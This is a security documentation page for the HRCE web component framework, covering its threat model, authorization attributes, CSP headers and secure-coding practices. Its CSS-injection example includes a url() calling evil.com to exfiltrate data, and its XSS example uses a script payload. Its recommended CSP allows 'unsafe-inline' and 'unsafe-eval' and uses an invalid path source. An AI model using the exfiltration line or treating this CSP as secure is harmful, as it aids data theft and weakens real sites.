# Security Model

This document describes the comprehensive security model implemented by HRCE.

---

## Security Architecture

HRCE implements defense-in-depth with multiple security layers:

```
┌────────────────────────────────────────────────┐
│         Layer 1: Transport Security            │
│  HTTPS, HSTS, Secure Cookies                   │
└────────────────────────────────────────────────┘
                    ↓
┌────────────────────────────────────────────────┐
│    Layer 2: Authentication & Authorization     │
│  ASP.NET Identity, JWT, OAuth                  │
└────────────────────────────────────────────────┘
                    ↓
┌────────────────────────────────────────────────┐
│    Layer 3: Component-Level Authorization      │
│  [ComponentAuthorize], Policy-Based Access     │
└────────────────────────────────────────────────┘
                    ↓
┌────────────────────────────────────────────────┐
│         Layer 4: Runtime Isolation             │
│  CSS Scoping, JS Sandbox, DOM Boundaries       │
└────────────────────────────────────────────────┘
                    ↓
┌────────────────────────────────────────────────┐
│      Layer 5: Output Security                  │
│  XSS Prevention, CSRF Tokens, CSP Headers      │
└────────────────────────────────────────────────┘
```

---

## Threat Model

### Threats HRCE Protects Against

#### 1. Cross-Site Scripting (XSS)

**Threat:** Malicious scripts injected into pages

**HRCE Protection:**
```csharp
// Automatic HTML encoding
var model = new ProductCardModel
{
    Title = "<script>alert('XSS')</script>",
    Description = "Safe content"
};

// Rendered as (safe):
// &lt;script&gt;alert('XSS')&lt;/script&gt;
```

**Additional Protection:**
- Svelte automatically escapes output
- Razor automatically escapes `@Model` expressions
- CSP headers restrict script sources

#### 2. Component Isolation Breach

**Threat:** One component affecting another component's behavior

**HRCE Protection:**
```javascript
// Component A cannot access Component B's DOM
// ❌ This fails:
document.querySelector('[data-component="ComponentB"]').remove();

// ✅ This works (scoped to own component):
document.querySelector('.my-button').addEventListener('click', handler);
```

#### 3. Unauthorized Component Access

**Threat:** User accessing components they shouldn't see

**HRCE Protection:**
```csharp
[ComponentAuthorize(Roles = "Admin")]
public record SensitiveDataModel : IPresentationModel
{
    // Only Admin role can render this component
}

// If unauthorized:
// - Component not rendered
// - No HTML output
// - Security event logged
```

#### 4. CSS Injection

**Threat:** Malicious styles affecting page layout or stealing data

**HRCE Protection:**
```css
/* Original (potentially malicious): */
.button { 
    background: url('http://evil.com/steal?data=...');
}

/* HRCE scopes and sanitizes: */
.button-a7b3f9 { 
    background: url('http://evil.com/steal?data=...'); /* CSP blocks */
}
```

**CSP Header prevents external resources:**
```
Content-Security-Policy: default-src 'self'
```

#### 5. JavaScript Sandbox Escape

**Threat:** Component JavaScript accessing global scope

**HRCE Protection:**
```javascript
(function(componentScope) {
  'use strict';
  
  // ❌ Fails - window is undefined in sandbox
  window.globalVar = 'value';
  
  // ❌ Fails - restricted document access
  document.body.innerHTML = '<h1>Hacked</h1>';
  
  // ✅ Works - scoped access only
  const button = document.querySelector('.my-button');
  
})( createSandbox('component-a7b3f9') );
```

---

## Authorization Mechanisms

### 1. Role-Based Authorization

```csharp
[ComponentAuthorize(Roles = "Admin,Manager")]
public record AdminPanelModel : IPresentationModel
{
    public string Title { get; init; }
    public IEnumerable<UserModel> Users { get; init; }
}
```

**Enforcement:**
```csharp
public async Task<string> RenderAsync(
    string componentName,
    object model,
    ClaimsPrincipal user)
{
    var attribute = model.GetType()
        .GetCustomAttribute<ComponentAuthorizeAttribute>();
    
    if (attribute != null)
    {
        var roles = attribute.Roles?.Split(',');
        if (roles != null && !roles.Any(r => user.IsInRole(r)))
        {
            _logger.LogWarning(
                "User {User} attempted to access {Component} without required role",
                user.Identity?.Name,
                componentName
            );
            return string.Empty; // Hide component
        }
    }
    
    // ... continue rendering
}
```

### 2. Policy-Based Authorization

```csharp
// Define policy
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("PremiumContent", policy =>
    {
        policy.RequireClaim("Subscription", "Premium", "Enterprise");
        policy.RequireAuthenticatedUser();
    });
});

// Apply to component
[ComponentAuthorize(Policy = "PremiumContent")]
public record PremiumFeatureModel : IPresentationModel
{
    // Only premium subscribers can see this
}
```

### 3. Claims-Based Authorization

```csharp
[ComponentAuthorize(Claims = "CanViewFinancials")]
public record FinancialDashboardModel : IPresentationModel
{
    public decimal Revenue { get; init; }
    public decimal Expenses { get; init; }
}
```

### 4. Custom Authorization Logic

```csharp
public class CustomComponentAuthorizer : IComponentAuthorizer
{
    public async Task<bool> AuthorizeAsync(
        string componentName,
        object model,
        ClaimsPrincipal user,
        HttpContext context)
    {
        // Custom logic
        if (componentName == "_SensitiveData")
        {
            // Check IP address
            var ip = context.Connection.RemoteIpAddress;
            if (!IsInternalIP(ip))
                return false;
            
            // Check time of day
            if (DateTime.Now.Hour < 8 || DateTime.Now.Hour > 18)
                return false;
        }
        
        return true;
    }
}
```

---

## Secure Data Flow

### Server to Client

```
Domain Model (Server)
        ↓ (Presenter transforms)
Presentation Model (Server)
        ↓ (HRCE renders & escapes)
Safe HTML (Server)
        ↓ (HTTPS)
Browser (Client)
```

**Security Points:**
1. ✅ Domain model never exposed to client
2. ✅ Presentation model sanitized
3. ✅ HTML automatically escaped
4. ✅ Transmission encrypted

### Client to Server

```
User Input (Client)
        ↓ (HTTPS)
Controller (Server)
        ↓ (Model validation)
Service Layer (Server)
        ↓ (Business logic validation)
Database (Server)
```

**Security Points:**
1. ✅ Input validation on server
2. ✅ CSRF token validation
3. ✅ Anti-forgery checks
4. ✅ SQL injection prevention (EF Core)

---

## Content Security Policy

### Recommended CSP Headers

```csharp
app.Use(async (context, next) =>
{
    var csp = new StringBuilder();
    csp.Append("default-src 'self'; ");
    csp.Append("script-src 'self' 'unsafe-inline' 'unsafe-eval'; ");
    csp.Append("style-src 'self' 'unsafe-inline'; ");
    csp.Append("img-src 'self' data: https:; ");
    csp.Append("font-src 'self'; ");
    csp.Append("connect-src 'self'; ");
    csp.Append("frame-ancestors 'none'; ");
    csp.Append("base-uri 'self'; ");
    csp.Append("form-action 'self';");
    
    context.Response.Headers.Add("Content-Security-Policy", csp.ToString());
    
    await next();
});
```

### HRCE-Specific CSP

```csharp
// Allow HRCE component scripts
csp.Append("script-src 'self' 'unsafe-inline' '/_svelte/'; ");

// Allow HRCE component styles
csp.Append("style-src 'self' 'unsafe-inline' '/_svelte/'; ");
```

---

## Security Best Practices

### 1. Never Trust Client Input

```csharp
// ❌ BAD: Directly using client input
public IActionResult Create(Product product)
{
    _db.Products.Add(product);
    _db.SaveChanges();
    return View(product);
}

// ✅ GOOD: Validate and transform
public IActionResult Create(ProductFormModel form)
{
    if (!ModelState.IsValid)
        return View(form);
    
    var product = _presenter.MapFromForm(form);
    // ... additional validation
    
    _db.Products.Add(product);
    _db.SaveChanges();
    
    var viewModel = _presenter.Present(product);
    return View(viewModel);
}
```

### 2. Use Presentation Models

```csharp
// ❌ BAD: Exposing domain model
@model Product
<div>@Model.InternalCost</div> // Sensitive data exposed!

// ✅ GOOD: Using presentation model
@model ProductCardModel
<div>@Model.PriceDisplay</div> // Only display price
```

### 3. Validate Authorization

```csharp
// ❌ BAD: No authorization check
public async Task<IActionResult> Delete(int id)
{
    var product = await _db.Products.FindAsync(id);
    _db.Products.Remove(product);
    await _db.SaveChangesAsync();
    return RedirectToAction("Index");
}

// ✅ GOOD: Check authorization
[Authorize(Roles = "Admin")]
public async Task<IActionResult> Delete(int id)
{
    var product = await _db.Products.FindAsync(id);
    
    // Additional check
    if (product.CreatedBy != User.Identity.Name && !User.IsInRole("Admin"))
        return Forbid();
    
    _db.Products.Remove(product);
    await _db.SaveChangesAsync();
    return RedirectToAction("Index");
}
```

### 4. Sanitize Output

```csharp
// ❌ BAD: Raw HTML output
@Html.Raw(Model.Description) // XSS vulnerability!

// ✅ GOOD: Automatic escaping
@Model.Description // Safe

// ✅ GOOD: Explicit sanitization if HTML needed
@Html.Sanitize(Model.Description) // Using sanitization library
```

### 5. Use HTTPS Only

```csharp
// Enforce HTTPS
builder.Services.AddHttpsRedirection(options =>
{
    options.RedirectStatusCode = StatusCodes.Status307TemporaryRedirect;
    options.HttpsPort = 443;
});

app.UseHttpsRedirection();

// HSTS
app.UseHsts();
```

---

## Logging Security Events

### Security Event Types

```csharp
public enum SecurityEventType
{
    UnauthorizedComponentAccess,
    IsolationViolation,
    SuspiciousInput,
    RateLimitExceeded,
    AuthenticationFailure
}
```

### Example Logging

```csharp
_logger.LogWarning(
    "Security Event: {EventType} | User: {User} | Component: {Component} | IP: {IP}",
    SecurityEventType.UnauthorizedComponentAccess,
    user.Identity?.Name ?? "Anonymous",
    componentName,
    httpContext.Connection.RemoteIpAddress
);
```

### Security Audit Log

```csharp
public class SecurityAuditLog
{
    public DateTime Timestamp { get; set; }
    public SecurityEventType EventType { get; set; }
    public string User { get; set; }
    public string Component { get; set; }
    public string IPAddress { get; set; }
    public string Details { get; set; }
    public bool Allowed { get; set; }
}
```

---

## Penetration Testing Checklist

- [ ] XSS injection in all model properties
- [ ] SQL injection in all inputs
- [ ] CSRF on all forms
- [ ] Authorization bypass attempts
- [ ] Component isolation breaches
- [ ] CSS injection attacks
- [ ] JavaScript sandbox escapes
- [ ] Path traversal attempts
- [ ] Rate limiting effectiveness
- [ ] Session hijacking protection

---

## Security Compliance

### OWASP Top 10

HRCE addresses:

1. ✅ **Injection** - Parameterized queries, input validation
2. ✅ **Broken Authentication** - ASP.NET Identity integration
3. ✅ **Sensitive Data Exposure** - Presentation models, HTTPS
4. ✅ **XML External Entities** - No XML processing
5. ✅ **Broken Access Control** - Component-level authorization
6. ✅ **Security Misconfiguration** - Secure defaults
7. ✅ **XSS** - Automatic escaping, CSP
8. ✅ **Insecure Deserialization** - Model validation
9. ✅ **Using Components with Known Vulnerabilities** - Regular updates
10. ✅ **Insufficient Logging & Monitoring** - Comprehensive logging

---

## Incident Response

### If Security Issue Discovered

1. **Isolate**: Disable affected component
2. **Log**: Capture all relevant details
3. **Notify**: Alert security team
4. **Patch**: Fix vulnerability
5. **Test**: Verify fix doesn't break functionality
6. **Deploy**: Roll out patch
7. **Review**: Post-mortem and improvements

---

## Summary

HRCE provides comprehensive security through:

- ✅ **Automatic XSS protection**
- ✅ **Component-level authorization**
- ✅ **Runtime isolation**
- ✅ **Secure by default configuration**
- ✅ **Defense in depth**
- ✅ **Comprehensive audit logging**

Security is **built-in, not bolted-on**.

---

## Next Steps

- [Learn about Isolation](../concepts/isolation-and-security.md)
- [Review Best Practices](../guides/create-component.md)
- [Explore Architecture](hrce-architecture.md)
